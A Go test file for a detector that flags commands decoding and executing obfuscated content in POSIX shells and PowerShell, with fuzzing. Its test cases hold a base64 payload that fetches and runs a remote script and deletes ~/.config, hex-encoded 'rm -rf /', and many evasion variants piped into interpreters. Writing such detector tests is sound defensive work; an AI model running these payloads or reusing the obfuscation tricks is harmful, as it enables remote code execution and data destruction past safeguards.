package encoded_test

import (
	"testing"

	"github.com/cyberchen1995/h-guard/pkg/detect/encoded"
	"github.com/cyberchen1995/h-guard/pkg/guard"
)

const blob = "Y3VybCAtcyBodHRwOi8veC5pby9hLnNoIHwgc2ggJiYgcm0gLXJmIH4vLmNvbmZpZw=="

// TestFindPOSIX：解码后交给解释器、内联解释器解码并执行、高熵内容直接交给 eval 或 sh -c，都算编码执行。
func TestFindPOSIX(t *testing.T) {
	for _, cmd := range []string{
		"echo " + blob + " | base64 -d | sh",
		"echo " + blob + " | base64 --decode | bash",
		"base64 -D <<< " + blob + " | zsh",
		`eval "$(echo ` + blob + ` | base64 -d)"`,
		"echo 726d202d7266202f | xxd -r -p | sh",
		`printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f' | sh`,
		"openssl enc -base64 -d <<< " + blob + " | bash",
		`python3 -c "import base64,os; os.system(base64.b64decode('` + blob + `'))"`,
		`node -e "require('child_process').execSync(Buffer.from('` + blob + `','base64').toString())"`,
		`perl -e 'use MIME::Base64; eval decode_base64("` + blob + `")'`,
		`eval "` + blob + `"`,
		`sh -c "` + blob + `"`,
		// 终审 I3：标志的各种写法、拆开的词、包装过的 shell、进程替换
		"echo " + blob + " | base64 -di | sh",
		"echo " + blob + " | base64 --dec | bash",
		"echo " + blob + " | base64${IFS}-d | sh",
		"echo " + blob + " | ba''se64 -d | sh",
		"echo " + blob + " | base64 -d | env bash",
		"echo " + blob + " | base64 -d | busybox sh",
		"echo " + blob + " | base64 -d | $SHELL",
		"echo " + blob + " | base64 -d | SH",
		"echo " + blob + " | base64 -d | gunzip | sh",
		"bash <(echo " + blob + " | base64 -d)",
		"source <(echo " + blob + " | base64 -d)",
		"echo " + blob + " | base64 -d | python3",
		"echo " + blob + " | base64 -d | python3 -",
	} {
		if !encoded.Find(cmd, guard.ShellPOSIX) {
			t.Errorf("not found: %s", cmd)
		}
	}
}

// TestFindPowerShell：-EncodedCommand 及其前缀写法、FromBase64String 或 [char] 拼接交给 iex / ScriptBlock。
func TestFindPowerShell(t *testing.T) {
	for _, cmd := range []string{
		"iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + blob + "')))",
		"[ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($p))).Invoke()",
		"Invoke-Expression ([char]114 + [char]109 + [char]32 + [char]45)",
		"iex '" + blob + "'",
		// 终审 I3：经 Get-Command 或 [char] 拼出的调用
		"& (gcm i*x) ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)))",
	} {
		if !encoded.Find(cmd, guard.ShellPowerShell) {
			t.Errorf("not found: %s", cmd)
		}
	}
}

// TestFindIgnores：只解码不执行、只执行不编码、凭据与哈希这类高熵内容，都不算。
func TestFindIgnores(t *testing.T) {
	for _, c := range []struct {
		cmd   string
		shell guard.Shell
	}{
		{"echo " + blob + " | base64 -d > out.txt", guard.ShellPOSIX},
		{"base64 -d secret.b64 > key.pem && chmod 600 key.pem", guard.ShellPOSIX},
		{"curl -s https://example.com/install.sh | sh", guard.ShellPOSIX},
		{"git checkout 11f6ad8ec52a2984abaafd7c3b516503785c2072", guard.ShellPOSIX},
		{`bash -c "cd node_modules && npm run build"`, guard.ShellPOSIX},
		{`bash -c "curl -H 'Authorization: Bearer ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0' https://api.github.com"`, guard.ShellPOSIX},
		{`python3 -c "import base64; print(base64.b64decode('` + blob + `'))"`, guard.ShellPOSIX},
		{"docker pull alpine@sha256:2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881", guard.ShellPOSIX},
		{"echo $((16#ff))", guard.ShellPOSIX},
		{"powershell -ExecutionPolicy Bypass -File build.ps1", guard.ShellPowerShell},
		{"[Convert]::FromBase64String($s) | Set-Content -Encoding Byte out.bin", guard.ShellPowerShell},
		{"Get-ChildItem | Where-Object { $_.Length -gt 1MB }", guard.ShellPowerShell},
		{"iex (Get-Content .\\setup.ps1 -Raw)", guard.ShellPowerShell},
		// 终审 C1：长路径不是编码内容；高熵内容必须就是被执行的那段
		{"source /Users/alice/Projects/myproject/venv/bin/activate", guard.ShellPOSIX},
		{"source /home/runner/work/MyRepo/MyRepo/scripts/env.sh", guard.ShellPOSIX},
		{"bash -c 'cd src/components/UserProfile/UserProfileCard2 && npm test'", guard.ShellPOSIX},
		{"bash -c /Users/Alice/Projects/MyApp2/build/scripts/run_all_tests.sh", guard.ShellPOSIX},
		{"iex (Get-Content C:/Users/Alice/Documents/Projects/WindowsPowerShell/Profile2.ps1 -Raw)", guard.ShellPowerShell},
		{"sh -c 'echo data:image/png;base64," + blob + " > a.uri'", guard.ShellPOSIX},
		{"eval \"$(ssh-agent -s)\" && ssh-add ~/.ssh/id_ed25519_GitHub2024_work", guard.ShellPOSIX},
		// 终审 I1：解码之后交给作为过滤器的解释器、写进文件、提到这些词的提交说明
		{"echo $JWT | cut -d. -f2 | base64 -d | python3 -m json.tool", guard.ShellPOSIX},
		{"kubectl get secret db -o jsonpath='{.data.config}' | base64 --decode | python3 -m json.tool", guard.ShellPOSIX},
		{"cat cert.b64 | base64 -d > cert.der && source ~/.bashrc", guard.ShellPOSIX},
		{"git commit -m 'decode with base64 -d | sh before eval'", guard.ShellPOSIX},
		{"echo $DATA | base64 -d | jq .", guard.ShellPOSIX},
		{"echo $P | base64 -d | perl -pe 's/a/b/'", guard.ShellPOSIX},
		{"echo $P | base64 -d | bash process.sh", guard.ShellPOSIX},
		{"grep -rn -e powershell -e pwsh .", guard.ShellPOSIX},
	} {
		if encoded.Find(c.cmd, c.shell) {
			t.Errorf("found in %s", c.cmd)
		}
	}
}

// FuzzFind：任何输入都不 panic。
func FuzzFind(f *testing.F) {
	f.Add("echo " + blob + " | base64 -d | sh")
	f.Fuzz(func(t *testing.T, cmd string) {
		encoded.Find(cmd, guard.ShellPOSIX)
		encoded.Find(cmd, guard.ShellPowerShell)
	})
}
